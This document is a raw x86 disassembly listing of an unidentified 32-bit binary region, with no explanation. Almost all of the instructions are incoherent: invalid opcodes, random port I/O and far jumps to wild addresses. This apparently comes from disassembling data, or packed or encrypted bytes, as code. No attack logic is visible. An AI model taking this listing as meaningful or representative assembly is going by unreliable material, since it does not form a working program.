  4079f4:	jl     0x407a15
  4079f6:	loop   0x407a02
  4079f8:	rcr    BYTE PTR [edi],0x94
  4079fb:	jb     0x407a6e
  4079fd:	xor    BYTE PTR ds:0xcf01c1a2,0x5
  407a04:	arpl   WORD PTR ds:0x39549586,cx
  407a0a:	test   eax,0x22722b89
  407a0f:	pop    ebp
  407a10:	xor    al,cl
  407a12:	addr16 gs gs retf 0xe3ab
  407a18:	jmp    0x407a52
  407a1a:	ja     0x4079dd
  407a1c:	mov    ebp,0x85542e4d
  407a21:	loop   0x407a7a
  407a23:	xlat   BYTE PTR ds:[ebx]
  407a24:	fstp   TBYTE PTR gs:[edi-0x7c32ae87]
  407a2b:	aaa    
  407a2c:	mov    ah,0xef
  407a2e:	(bad)  
  407a2f:	(bad)  
  407a31:	in     al,0xb7
  407a33:	loope  0x4079fd
  407a35:	retf   0xb04
  407a38:	push   ebp
  407a39:	add    BYTE PTR [eax],al
  407a3b:	pop    esi
  407a3c:	fist   DWORD PTR [eax+eiz*1-0x30ef0c9f]
  407a43:	xchg   edi,eax
  407a44:	or     eax,0x3193ef97
  407a49:	jmp    0x407a9e
  407a4b:	cs fs fwait
  407a4e:	iretw  
  407a50:	shl    DWORD PTR [ebp+0x6a],0x2e
  407a54:	ins    BYTE PTR es:[edi],dx
  407a55:	mov    WORD PTR [ecx],cs
  407a57:	lods   al,BYTE PTR ds:[esi]
  407a58:	repz popf 
  407a5a:	push   edx
  407a5b:	mov    al,ds:0x8bf366a5
  407a60:	out    dx,al
  407a61:	addr16 test eax,0x839958da
  407a67:	dec    esi
  407a68:	adc    al,0xbb
  407a6a:	and    edx,DWORD PTR [ebp+0x65d096b5]
  407a70:	or     ch,BYTE PTR [eax+0x55]
  407a73:	dec    eax
  407a74:	lods   al,BYTE PTR ds:[esi]
  407a75:	lahf   
  407a76:	mov    eax,0x9c53967d
  407a7b:	mov    cl,0x14
  407a7d:	xor    al,0x20
  407a7f:	inc    eax
  407a80:	jmp    0xd9ed5443
  407a85:	lahf   
  407a86:	jns    0x407adc
  407a88:	add    bh,BYTE PTR [edi-0x54]
  407a8b:	inc    ebp
  407a8c:	jbe    0x407a53
  407a8e:	add    BYTE PTR [ecx],al
  407a90:	dec    ebx
  407a91:	mov    esi,0x32f6d225
  407a96:	jmp    0x6818:0x94a47243
  407a9d:	mov    bl,0x36
  407a9f:	cmp    eax,0x650e9b47
  407aa4:	ins    BYTE PTR es:[edi],dx
  407aa5:	pushw  ds
  407aa7:	popa   
  407aa8:	(bad)  
  407aa9:	enter  0x8e0,0xf8
  407aad:	sbb    DWORD PTR [eax+0x14],esp
  407ab0:	fmul   st,st(4)
  407ab2:	sar    edi,1
  407ab4:	sar    BYTE PTR [ecx+0x5b],1
  407ab7:	add    esp,edi
  407ab9:	loope  0x407aa8
  407abb:	test   BYTE PTR [edx+ebp*2],dl
  407abe:	inc    esp
  407abf:	loope  0x407a66
  407ac1:	ins    DWORD PTR es:[edi],dx
  407ac2:	xchg   esi,eax
  407ac3:	xor    cl,BYTE PTR [eax]
  407ac5:	and    BYTE PTR [esi+0x57],ch
  407ac8:	in     al,dx
  407ac9:	push   edi
  407aca:	(bad)  
  407acb:	mov    ah,0xc0
  407acd:	(bad)  
  407ace:	mov    edx,0x7f353092
  407ad3:	in     al,0x1e
  407ad5:	call   0x4637f83d
  407ada:	add    eax,0x36660d47
  407adf:	rol    BYTE PTR [ecx],1
  407ae1:	repnz pop ss
  407ae3:	xchg   ebx,ecx
  407ae5:	das    
  407ae6:	inc    esi
  407ae7:	xchg   esi,eax
  407ae8:	mov    dh,0x2a
  407aea:	inc    eax
  407aeb:	shl    ah,cl
  407aed:	mov    edi,0xf096d039
  407af2:	pusha  
  407af3:	adc    DWORD PTR ds:0xa4f62400,ecx
  407af9:	rcr    ah,cl
  407afb:	or     BYTE PTR gs:[eax+0x2e],cl
  407aff:	or     al,0x42
  407b01:	jp     0x407a9f
  407b03:	push   ss
  407b04:	xor    DWORD PTR [edi-0x7d5a0a4f],esp
  407b0a:	jae    0x407a9c
  407b0c:	xchg   ebp,eax
  407b0d:	sahf   
  407b0e:	xchg   ecx,eax
  407b0f:	jecxz  0x407b24
  407b11:	mov    ebx,0x3370125a
  407b16:	mov    BYTE PTR [ebx],0xc7
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	dec    esi
  407b40:	ins    DWORD PTR es:[edi],dx
  407b41:	jg     0x407b4a
  407b43:	push   edi
  407b44:	leave  
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407aec
  407b4c:	mov    edx,0x56f60cdf
  407b51:	add    DWORD PTR [edi],esp
  407b53:	xor    eax,0x48a81df3
  407b58:	outs   dx,BYTE PTR ds:[esi]
  407b5a:	sub    DWORD PTR [ebx+0x6cbcca60],ebp
  407b60:	lock mov ecx,0xd047c91
  407b66:	scas   al,BYTE PTR es:[edi]
  407b67:	out    0xa7,eax
  407b69:	xor    eax,0x7a028a61
  407b6e:	out    0xc1,al
  407b70:	add    al,0xb5
  407b72:	push   ebp
  407b73:	inc    esi
  407b74:	add    ebp,edi
  407b76:	(bad)  
  407b77:	push   es
  407b78:	xchg   ebp,eax
  407b79:	mov    dh,0xb8
  407b7b:	xor    eax,0xee1c4f21
  407b80:	pop    ss
  407b81:	cdq    
  407b82:	into   
  407b83:	dec    edx
  407b84:	and    bh,al
  407b86:	push   esi
  407b87:	(bad)  
  407b88:	js     0x407ba4
  407b8a:	or     ebx,0xffffffd7
  407b8d:	bound  edx,QWORD PTR [esi+ebp*1-0x7706e0ab]
  407b94:	nop
  407b95:	dec    eax
  407b96:	retf   
  407b97:	mov    WORD PTR [eax],ds
  407b99:	test   al,0x2c
  407b9b:	dec    ecx
  407b9c:	js     0x407bc7
  407b9e:	inc    esp
  407b9f:	pop    ebp
  407ba0:	xor    eax,0x2a0c8e92
  407ba5:	adc    al,0xcf
  407ba7:	push   ecx
  407ba8:	loopne 0x407b6e
  407baa:	test   al,0xc4
  407bac:	mov    edi,0xcb523b0f
  407bb1:	pop    esp
  407bb2:	pop    esp
  407bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb4:	mov    bh,BYTE PTR [ebx]
  407bb6:	cmp    eax,0x9414b9aa
  407bbb:	(bad)  
  407bbc:	mov    bl,0xf8
  407bbe:	xchg   ebp,eax
  407bbf:	dec    ecx
  407bc0:	retf   
  407bc1:	pop    es
  407bc2:	push   esp
  407bc3:	arpl   WORD PTR [ebx+ecx*8],cx
  407bc6:	cmp    ebp,DWORD PTR [edi]
  407bc8:	push   ebp
  407bc9:	mov    cl,BYTE PTR [esp+eax*2+0x55294917]
  407bd0:	push   esi
  407bd1:	jne    0x407ba4
  407bd3:	sub    eax,0x29f56eee
  407bd8:	inc    eax
  407bd9:	(bad)  
  407bdb:	adc    ch,BYTE PTR [eax-0x5efe4f0a]
  407be1:	aad    0x89
  407be3:	clc    
  407be4:	or     esp,DWORD PTR [ebp+ebp*2-0x72]
  407be8:	(bad)  
  407be9:	addr16 fdivr st,st(7)
  407bec:	push   esp
  407bed:	cmp    ebp,esp
  407bef:	jno    0x407c3f
  407bf1:	dec    edi
  407bf2:	and    al,0x25
  407bf4:	lods   al,BYTE PTR ds:[esi]
  407bf5:	pop    esi
  407bf6:	sbb    al,0xba
  407bf8:	jge    0x407c28
  407bfa:	inc    dh
  407bfc:	hlt    
  407bfd:	idiv   DWORD PTR [esi+0x38ea9cdf]
  407c03:	pusha  
  407c04:	mov    ch,0xae
  407c06:	adc    DWORD PTR [edi+0x29],ecx
  407c09:	xchg   ebp,eax
  407c0a:	out    0x46,al
  407c0c:	inc    edx
  407c0d:	ja     0x407b90
  407c0f:	mov    bl,0xa6
  407c11:	xchg   BYTE PTR [ebp+0x531f55b3],ch
  407c17:	xchg   ecx,eax
  407c18:	cmp    DWORD PTR [esi-0x7c5e1f1a],esi
  407c1e:	dec    esi
  407c1f:	mov    ch,0x6
  407c21:	adc    esi,edx
  407c23:	dec    esp
  407c24:	or     esp,DWORD PTR [ebp+0x4483dd4b]
  407c2a:	and    eax,0xe4e6a391
  407c2f:	mov    bh,0x8f
  407c31:	mov    bh,0x23
  407c33:	popa   
  407c34:	xchg   ebx,eax
  407c35:	pop    ds
  407c36:	jno    0x407ca5
  407c38:	fmul   DWORD PTR [edx-0x59509a7]
  407c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c3f:	and    eax,ebx
  407c41:	push   ecx
  407c42:	arpl   WORD PTR [ebp+0x140a81b9],cx
  407c48:	and    ah,bh
  407c4a:	jmp    0xf747ca55
  407c4f:	scas   al,BYTE PTR es:[edi]
  407c50:	imul   eax,DWORD PTR [eax-0x54],0x310ca519
  407c57:	scas   eax,DWORD PTR es:[edi]
  407c58:	mov    cs,edi
  407c5a:	mov    al,0x26
  407c5c:	mov    dh,0xe8
  407c5e:	and    ebx,eax
  407c60:	pop    edx
  407c61:	in     eax,0xc1
  407c63:	clc    
  407c64:	mov    al,0xcc
  407c66:	ds inc esi
  407c68:	adc    al,0x1d
  407c6a:	sbb    eax,0x972b63e3
  407c6f:	retf   0x62d7
  407c72:	sbb    bl,bh
  407c74:	sbb    al,0x9e
  407c76:	(bad)  
  407c77:	and    BYTE PTR [esi+0x6],bl
  407c7a:	shr    edi,cl
  407c7c:	push   esp
  407c7d:	xchg   BYTE PTR [ebp+0x58],cl
  407c80:	or     cl,cl
  407c82:	into   
  407c83:	xlat   BYTE PTR ds:[ebx]
  407c84:	neg    BYTE PTR [edx-0x41]
  407c87:	out    0x3c,al
  407c89:	das    
  407c8a:	fstp   TBYTE PTR [eax+0x67]
  407c8d:	jb     0x407d03
  407c8f:	xchg   esp,eax
  407c90:	adc    edi,DWORD PTR [ecx+0x3d14012]
  407c96:	fdiv   DWORD PTR [edx]
  407c98:	mov    edi,0x905cca99
  407c9d:	inc    ecx
  407c9e:	aad    0x60
  407ca0:	dec    eax
  407ca1:	push   edi
  407ca2:	or     DWORD PTR [edi+0x5ea7bab0],edx
  407ca8:	cmp    bh,bh
  407caa:	frndint 
  407cac:	jge    0x407cb2
  407cae:	cs aaa 
  407cb0:	stos   BYTE PTR es:[edi],al
  407cb1:	repz cdq 
  407cb3:	fadd   DWORD PTR [ecx+0x1671a13d]
  407cb9:	and    BYTE PTR [edx+0x56036e89],bh
  407cbf:	push   0xf0fdf180
  407cc4:	test   BYTE PTR [edi+0x27],0x49
  407cc8:	outs   dx,DWORD PTR ds:[esi]
  407cc9:	fmul   QWORD PTR ds:0xb92e
  407cce:	jl     0x407d39
  407cd0:	mov    eax,0xa0fc0aa9
  407cd5:	xlat   BYTE PTR ds:[ebx]
  407cd6:	mov    ebp,0xe94e1c20
  407cdb:	cmp    ecx,DWORD PTR [ecx]
  407cdd:	sub    al,0xa8
  407cdf:	sub    edi,DWORD PTR [ebx+ecx*8+0x1b]
  407ce3:	ror    DWORD PTR [esi-0x3c7f621f],1
  407ce9:	xor    al,0x9
  407ceb:	cmp    DWORD PTR ds:0xbcfc284,edx
  407cf1:	xchg   edx,eax
  407cf2:	add    cl,BYTE PTR [edi+0x7b0e2f94]
  407cf8:	mov    ecx,0xc1f3b48f
  407cfd:	jne    0x407d41
  407cff:	sbb    BYTE PTR es:[ecx-0x47719143],bh
  407d06:	dec    edi
  407d07:	xchg   ebx,ecx
  407d09:	jl     0x407d2f
  407d0b:	inc    esi
  407d0c:	inc    ebx
  407d0d:	jbe    0x407d6a
  407d0f:	dec    eax
  407d10:	ds js  0x407ce9
  407d13:	xchg   ebx,eax
  407d14:	call   0xc9428250
  407d19:	retf   
  407d1a:	mov    bl,0x3
  407d1c:	push   ss
  407d1d:	add    dh,BYTE PTR [edi]
  407d1f:	dec    edx
  407d20:	ins    DWORD PTR es:[edi],dx
  407d21:	sbb    cl,ah
  407d23:	mov    dl,0x76
  407d25:	jbe    0x407d52
  407d27:	les    edx,FWORD PTR [edi]
  407d29:	xor    ebp,0x79839890
  407d2f:	in     eax,dx
  407d30:	sbb    eax,DWORD PTR [edx-0x19ab2204]
  407d36:	xor    BYTE PTR [ecx],cl
  407d38:	inc    esi
  407d39:	call   0x2d67:0x216ea81
  407d40:	mov    al,ds:0x1f4003fd
  407d45:	mov    ?,edx
  407d47:	daa    
  407d48:	cmp    al,0xea
  407d4a:	adc    bl,0x9f
  407d4d:	test   DWORD PTR [eax+eax*1],edx
  407d50:	xchg   esi,eax
  407d51:	rcr    BYTE PTR [ebp+0x7fe00f17],0x4
  407d58:	mov    dl,0xf0
  407d5b:	push   0x22
  407d5d:	outs   dx,BYTE PTR ds:[esi]
  407d5e:	inc    ebp
  407d5f:	retf   
  407d60:	push   ss
  407d61:	mov    eax,ds:0x6997f135
  407d66:	mov    ah,0x4d
  407d68:	popf   
  407d69:	inc    eax
  407d6a:	cli    
  407d6b:	enter  0x9c3,0xff
  407d6f:	adc    al,bl
  407d71:	push   cs
  407d72:	cmp    esp,ebx
  407d74:	aam    0x12
  407d76:	cmp    al,0xdd
  407d78:	dec    esi
  407d79:	ins    DWORD PTR es:[edi],dx
  407d7a:	mov    cl,0x5
  407d7c:	xor    edx,DWORD PTR [edx+0x5970a3cc]
  407d82:	in     al,dx
  407d83:	mov    ds:0xaa26d538,al
  407d88:	inc    ecx
  407d89:	rcr    BYTE PTR [eax-0x41],1
  407d8c:	push   eax
  407d8d:	(bad)  
  407d8e:	jne    0x407d80
  407d90:	loopne 0x407dec
  407d92:	push   0x76a6dfaf
  407d97:	adc    dl,BYTE PTR [edi+edi*4+0x49]
  407d9b:	jp     0x407d4d
  407d9d:	pushf  
  407d9e:	pop    esi
  407d9f:	test   al,0x92
  407da1:	pop    edx
  407da2:	add    esi,esp
  407da4:	outs   dx,BYTE PTR ds:[esi]
  407da5:	sahf   
  407da6:	dec    ebx
  407da7:	sbb    bl,BYTE PTR [ecx+eiz*8]
  407daa:	and    eax,0x100efe39
  407daf:	aam    0x77
  407db1:	arpl   ax,si
  407db3:	sbb    eax,0x295403a6
  407db8:	jno    0x407def
  407dba:	inc    eax
  407dbb:	sti    
  407dbc:	pop    ss
  407dbd:	mov    cl,BYTE PTR [ecx+edi*1-0x70]
  407dc1:	shl    BYTE PTR ds:0x842e7559,cl
  407dc7:	shr    DWORD PTR [ebx+eax*2+0x7f9c51ff],cl
  407dce:	fs push esi
  407dd0:	imul   ebp,DWORD PTR [ecx],0xffffffd5
  407dd3:	bound  esi,QWORD PTR [eax-0xa]
  407dd6:	sub    edx,DWORD PTR [ebx+0x2c]
  407dd9:	inc    edx
  407dda:	ror    DWORD PTR [ecx],0x26
  407ddd:	dec    BYTE PTR [bp-0x1a45]
  407de2:	push   0x74
  407de4:	in     eax,0x4c
  407de6:	sub    DWORD PTR [eax+eax*2],0x854991c2
  407ded:	ror    ebp,1
  407def:	add    eax,0xd775367
  407df4:	test   BYTE PTR [edx+ecx*8-0x455694f5],dl
  407dfb:	rcr    DWORD PTR [esi],cl
  407dfd:	loopne 0x407df5
  407dff:	mov    ds:0xc600ab4e,eax
  407e04:	rol    dl,1
  407e06:	xchg   ebx,eax
  407e07:	pop    esp
  407e08:	mov    DWORD PTR [ebx-0x28],esi
  407e0b:	ror    esi,1
  407e0d:	or     eax,0x2a9ce6aa
  407e12:	fimul  WORD PTR [esi+0x71]
  407e15:	cld    
  407e16:	ret    0xb81e
  407e19:	xchg   ebx,eax
  407e1a:	adc    al,cl
  407e1c:	arpl   bx,bx
  407e1e:	xchg   ebx,eax
  407e1f:	inc    ebp
  407e20:	js     0x407df6
  407e22:	inc    esi
  407e23:	push   ds
  407e24:	call   0xa87fb034
  407e29:	pop    ecx
  407e2a:	sub    dl,ah
  407e2c:	jns    0x407de9
  407e2e:	ds or  cl,ch
  407e31:	xor    al,0xca
  407e33:	in     al,dx
  407e34:	add    DWORD PTR [esi-0x2d],ebp
  407e37:	retf   0xd3e4
  407e3a:	out    0x1d,al
  407e3c:	mov    ah,0xec
  407e3e:	mov    ds:0x22f6cf7e,eax
  407e43:	push   cs
  407e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e45:	xor    BYTE PTR [edi+0x384c0c17],0x70
  407e4c:	or     eax,0x9cb6e0e8
  407e51:	and    esi,ecx
  407e53:	sub    BYTE PTR ds:[eax+edx*8],dl
  407e57:	sub    ebx,DWORD PTR [edi]
  407e59:	pop    ebp
  407e5a:	rcl    DWORD PTR [eax+ebx*4+0x20a478e1],0xbd
  407e62:	mov    edi,0xf070da27
  407e67:	hlt    
  407e68:	push   eax
  407e69:	push   edi
  407e6a:	pop    DWORD PTR es:[edi]
  407e6d:	popa   
  407e6e:	jmp    0x17b828e9
  407e73:	dec    esp
  407e74:	jns    0x407e5c
  407e76:	pop    edi
  407e77:	ins    BYTE PTR es:[edi],dx
  407e78:	and    al,0x9e
  407e7a:	sub    al,0x3b
  407e7d:	mov    ds:0x45890000,al
  407e82:	clc    
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	jne    0x407e56
  407e9a:	gs jmp 0x70b153a7
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407ee3
  407ea5:	dec    DWORD PTR [edx]
  407ea7:	je     0x407e5d
  407ea9:	dec    ebx
  407eaa:	jge    0x407e85
  407eac:	push   eax
  407ead:	xchg   esp,eax
  407eae:	sbb    BYTE PTR [ebx-0x1fba971a],dl
  407eb4:	ret    0x84cb
  407eb7:	cmp    bl,BYTE PTR [edx-0x20]
  407eba:	xchg   ecx,eax
  407ebb:	test   al,0xbb
  407ebd:	out    dx,al
  407ebe:	cmp    ch,al
  407ec0:	jne    0x407ec1
  407ec2:	vmptrst QWORD PTR [ebx-0x1b]
  407ec6:	pop    ebx
  407ec7:	or     eax,0xb24792bf
  407ecc:	and    bh,BYTE PTR [esi]
  407ece:	jmp    0x407ed9
  407ed0:	push   ebp
  407ed1:	out    dx,eax
  407ed2:	fnstenv [ebx+0x42]
  407ed5:	dec    eax
  407ed6:	data16 clc 
  407ed8:	(bad)  
  407ed9:	into   
  407eda:	cs dec esp
  407edc:	push   ecx
  407edd:	jl     0x407ee1
  407edf:	xor    esp,ebx
  407ee1:	xchg   edi,eax
  407ee2:	or     BYTE PTR [eax+edx*1+0x36],0xb3
  407ee7:	jmp    0x7b38b9c6
  407eec:	sar    al,1
  407eee:	mov    eax,ds:0xc095412a
  407ef3:	das    
  407ef4:	mov    ecx,0x30af5089
  407ef9:	mov    esi,0xcd1a1c60
  407efe:	sub    bl,BYTE PTR [edx-0x5800b853]
  407f04:	aaa    
  407f05:	sti    
  407f06:	loop   0x407eff
  407f08:	xor    al,bh
  407f0a:	xor    DWORD PTR [esi+edi*2+0x1c6cdaf5],ebx
  407f11:	dec    ebp
  407f12:	sub    al,0x65
  407f14:	sbb    DWORD PTR [eax+0x18],ecx
  407f17:	(bad)  
  407f18:	sub    ecx,DWORD PTR [ecx]
  407f1a:	stos   BYTE PTR es:[edi],al
  407f1b:	into   
  407f1c:	mul    DWORD PTR [ebx]
  407f1e:	push   edi
  407f1f:	cld    
  407f20:	mov    eax,0x4593137a
  407f25:	shl    DWORD PTR [ebx+ebp*8-0x26],cl
  407f29:	xor    esi,eax
  407f2b:	fadd   DWORD PTR [edx-0x27]
  407f2e:	push   esp
  407f2f:	fwait
  407f30:	rol    esi,1
  407f32:	mov    edx,0x5436ee2e
  407f37:	enter  0x7fd7,0x5f
  407f3b:	mov    esi,0x593b2725
  407f40:	outs   dx,BYTE PTR ds:[esi]
  407f41:	(bad)  
  407f42:	mov    dx,0x26dc
  407f46:	loopne 0x407fba
  407f48:	or     DWORD PTR [ebp+0x6ec8e08c],ecx
  407f4e:	jnp    0x407f70
  407f50:	iret   
  407f51:	xor    dl,al
  407f53:	stos   BYTE PTR es:[edi],al
  407f54:	out    0x33,al
  407f56:	(bad)  
  407f57:	iret   
  407f58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f59:	test   al,0x90
  407f5b:	and    DWORD PTR [eax-0xe17049d],esp
  407f61:	cmp    al,0x13
  407f63:	inc    ebx
  407f64:	cli    
  407f65:	adc    eax,0x2724f232
  407f6a:	in     al,0x98
  407f6c:	inc    ebx
  407f6d:	dec    eax
  407f6e:	bound  ebx,QWORD PTR [eax]
  407f70:	and    edx,esi
  407f72:	xchg   esp,eax
  407f73:	cmp    DWORD PTR ds:0x2e10b89c,edi
  407f79:	call   0x35f7d3e2
  407f7e:	dec    eax
  407f7f:	stos   DWORD PTR es:[edi],eax
  407f80:	(bad)  [eax]
  407f82:	scas   al,BYTE PTR es:[edi]
  407f83:	inc    ebp
  407f84:	jmp    0x407f6f
  407f86:	pop    esp
  407f87:	jg     0x407f62
  407f89:	popa   
  407f8a:	sbb    al,0xd5
  407f8c:	inc    esp
  407f8d:	add    al,0xca
  407f8f:	ds push ss
  407f91:	mov    edx,0x1b96727b
  407f96:	inc    ecx
  407f97:	leave  
  407f98:	or     al,0x1c
  407f9a:	sbb    BYTE PTR [ecx-0x21a74637],ah
  407fa0:	jno    0x407ffb
  407fa2:	mov    ch,0x22
  407fa4:	sbb    DWORD PTR [eax-0x159f51c5],ebx
  407faa:	xor    al,0xaf
  407fac:	stos   BYTE PTR es:[edi],al
  407fad:	fistp  QWORD PTR [esi]
  407faf:	jae    0x408025
  407fb1:	mov    WORD PTR [esi+0x6f],ss
  407fb4:	cmp    dl,BYTE PTR [ebx-0x7f5f01a5]
  407fba:	and    BYTE PTR [esi],bh
  407fbc:	push   esi
  407fbd:	ss popa 
  407fbf:	ins    BYTE PTR es:[edi],dx
  407fc0:	adc    DWORD PTR [esi-0x4a],ebp
  407fc3:	dec    ecx
  407fc4:	mov    al,0x3c
  407fc6:	inc    eax
  407fc7:	push   ebp
  407fc8:	or     DWORD PTR [edx-0x32a43bc4],edi
  407fce:	jb     0x407fad
  407fd0:	cs jb  0x408035
  407fd3:	in     al,0xd3
  407fd5:	mov    eax,0x3066f9d3
  407fda:	xor    edx,DWORD PTR [ebx-0x6dcba0cb]
  407fe0:	sahf   
  407fe1:	jl     0x407fc1
  407fe3:	dec    edi
  407fe4:	jecxz  0x407f74
  407fe6:	cld    
  407fe7:	mov    edx,0x4d8cadac
  407fec:	push   ds
  407fed:	inc    ebx
  407fee:	mov    al,0xd9
  407ff0:	imul   cl
  407ff2:	mov    eax,0x6f398c21
  407ff7:	jae    0x40800a
  407ff9:	mov    esp,0xbd6ae5b1
  407ffe:	push   ds
  407fff:	ds popf 
  408001:	cli    
  408002:	mov    ebx,0xba1be84b
  408007:	cmp    esp,DWORD PTR [ebp-0x22]
  40800a:	xchg   ebp,ebp
  40800c:	mov    ch,0x8
  40800e:	jbe    0x40804c
  408010:	pop    eax
  408011:	pop    ds
  408012:	fidivr DWORD PTR [esi+0x45601bc0]
  408018:	fs fs mov dl,0xa2
  40801c:	xchg   edx,eax
  40801d:	cmp    DWORD PTR [edx],edi
  40801f:	(bad)  
  408021:	mov    BYTE PTR [ebp-0x7c851052],ah
  408027:	aaa    
  408028:	sub    eax,0xe4007c0b
  40802d:	retf   
  40802e:	ret    
  40802f:	add    DWORD PTR [edi-0x1c38b264],ebp
  408035:	nop
  408036:	dec    ecx
  408037:	sbb    al,0xaa
  408039:	pop    edx
  40803a:	mov    edx,0x2f8f846f
  40803f:	sub    eax,0x6c660dc6
  408044:	add    al,BYTE PTR [esi]
  408046:	sbb    dh,al
  408048:	dec    ebx
  408049:	sub    bl,BYTE PTR [ebx+0x26926b4a]
  40804f:	pop    edx
  408050:	aad    0x75
  408052:	or     eax,0xecb7614c
  408057:	push   cs
  408058:	imul   eax,DWORD PTR [edi+ebp*1],0xfffffffd
  40805c:	cli    
  40805d:	or     DWORD PTR [edx+0x24],esp
  408060:	cwd    
  408062:	lods   eax,DWORD PTR ds:[esi]
  408063:	adc    al,0xd9
  408065:	sar    eax,cl
  408067:	xchg   esp,eax
  408068:	inc    esi
  408069:	xor    cl,BYTE PTR [edi-0x7]
  40806c:	push   ebp
  40806d:	mov    bh,0x77
  40806f:	nop
  408070:	cmc    
  408071:	sbb    BYTE PTR [edi],0x27
  408074:	mov    esp,0x8d810073
  408079:	pop    ebx
  40807a:	cwde   
  40807b:	mov    al,ds:0xfdf456c
  408080:	mov    edi,0xa4deda87
  408085:	add    DWORD PTR ds:0x56250167,edi
  40808b:	sub    bl,BYTE PTR [edx-0x1cadb673]
  408091:	cmp    bl,bl
  408093:	sub    ah,BYTE PTR [ebx]
  408095:	xor    BYTE PTR [edx-0x5be317df],dh
  40809b:	clc    
  40809c:	cmp    dh,dl
  40809e:	ins    DWORD PTR es:[edi],dx
  40809f:	or     BYTE PTR [edi+0xb],ch
  4080a2:	or     BYTE PTR ss:[ecx-0x127454ee],bh
  4080a9:	mov    cl,0x32
  4080ab:	pop    esp
  4080ac:	pop    edi
  4080ad:	imul   esp,DWORD PTR [ebx+0x4ac8ea6],0x71
  4080b4:	stos   BYTE PTR es:[edi],al
  4080b5:	out    0xea,al
  4080b7:	add    DWORD PTR ds:0xdb1c2b91,ebx
  4080bd:	jno    0x408066
  4080bf:	pop    es
  4080c0:	xor    BYTE PTR [edi+0x4],al
  4080c3:	lea    ebp,[ebx+eiz*4-0x3c]
  4080c7:	fsub   QWORD PTR [eax]
  4080c9:	xchg   ebx,eax
  4080ca:	out    0x53,eax
  4080cc:	fcomi  st,st(3)
  4080ce:	adc    al,0x93
  4080d0:	pusha  
  4080d1:	popf   
  4080d2:	xchg   ebx,eax
  4080d3:	arpl   WORD PTR [esi+0x48],cx
  4080d6:	dec    ebp
  4080d7:	les    ebx,FWORD PTR [edi]
  4080d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080da:	inc    ebx
  4080db:	(bad)  
  4080dc:	push   esp
  4080dd:	outs   dx,BYTE PTR ds:[esi]
  4080de:	jb     0x408079
  4080e0:	fbld   TBYTE PTR gs:0xfa90c9b0
  4080e7:	sbb    DWORD PTR [edi],esp
  4080e9:	(bad)  
  4080ea:	jb     0x408127
  4080ec:	ss ins DWORD PTR es:[edi],dx
  4080ee:	jmp    0xf5c2011d
  4080f3:	aam    0xad
  4080f5:	lea    edi,[ebp-0x2d]
  4080f8:	or     BYTE PTR [eax-0x7e],al
  4080fb:	popa   
  4080fc:	ret    
  4080fd:	xlat   BYTE PTR ds:[ebx]
  4080fe:	adc    ch,BYTE PTR [esp+edx*1+0x58cd0e93]
  408105:	sahf   
  408106:	mov    esi,0xccc06105
  40810b:	dec    ecx
  40810c:	push   cs
  40810d:	sbb    ebx,DWORD PTR fs:[edx]
  408110:	inc    esp
  408111:	shl    BYTE PTR [esi-0x56],cl
  408114:	mov    eax,ds:0xfe2c5ccd
  408119:	nop
  40811a:	and    eax,0x90278e89
  40811f:	mov    ecx,esi
  408121:	and    al,0x97
  408123:	inc    ebp
  408124:	inc    esi
  408125:	jmp    0x737f6d03
  40812a:	daa    
  40812b:	mov    al,ds:0xee63dc11
  408130:	or     eax,0x2bdef068
  408135:	or     ecx,DWORD PTR [eax]
  408137:	pop    edx
  408138:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408139:	mov    bl,0x95
  40813b:	lods   eax,DWORD PTR ds:[esi]
  40813c:	ds sahf 
  40813e:	pop    ebx
  40813f:	test   eax,0x1763204f
  408144:	push   edi
  408145:	sti    
  408146:	push   es
  408147:	mov    ds:0xf702353d,al
  40814d:	dec    esi
  40814e:	enter  0x14dc,0x41
  408152:	ins    DWORD PTR es:[edi],dx
  408153:	and    esp,DWORD PTR [ecx-0x68]
  408156:	enter  0x4730,0x75
  40815a:	and    DWORD PTR [eax],ecx
  40815c:	adc    BYTE PTR [eax],cl
  40815e:	aam    0xeb
  408160:	(bad)  
  408161:	xchg   edi,eax
  408162:	xchg   edi,eax
  408163:	lods   eax,DWORD PTR ds:[esi]
  408164:	mov    ds:0x1cde69ca,al
  408169:	(bad)  
  40816a:	xor    al,0x68
  40816c:	nop
  40816d:	outs   dx,DWORD PTR ds:[esi]
  40816e:	dec    esi
  40816f:	outs   dx,BYTE PTR ds:[esi]
  408170:	and    esi,esp
  408172:	push   0x8d923119
  408177:	sbb    DWORD PTR [edx],0x41
  40817a:	je     0x408159
  40817c:	les    ecx,FWORD PTR [eax]
  40817e:	xlat   BYTE PTR ds:[ebx]
  40817f:	cmp    esi,edx
  408181:	xor    al,bl
  408183:	pop    eax
  408184:	mov    ah,0x53
  408186:	add    ah,BYTE PTR [edx]
  408188:	adc    ch,dl
  40818a:	aad    0x1
  40818c:	dec    eax
  40818d:	sub    ah,BYTE PTR [eax-0x51]
  408190:	les    esp,FWORD PTR [eax]
  408192:	xchg   ebx,eax
  408193:	ins    BYTE PTR es:[edi],dx
  408194:	jge    0x408159
  408196:	stos   BYTE PTR es:[edi],al
  408197:	and    dl,ah
